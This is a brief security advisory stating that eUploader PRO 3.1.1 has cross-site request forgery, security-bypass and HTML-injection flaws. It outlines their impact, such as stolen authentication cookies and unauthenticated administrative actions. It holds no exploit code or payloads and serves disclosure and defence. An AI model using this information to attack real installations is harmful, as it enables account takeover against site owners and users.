BOLDfx eUploader is prone to multiple remote vulnerabilities, including a cross-site request-forgery vulnerability, a security-bypass vulnerability, and an HTML-injection vulnerability.

Attacker-supplied HTML and script code could run in the context of the affected site, potentially allowing an attacker to steal cookie-based authentication credentials and to control how the site is rendered to the user. A remote attacker may also be able to perform certain administrative actions without proper authentication; other attacks are also possible.

eUploader PRO 3.1.1 is vulnerable; other versions may also be affected.
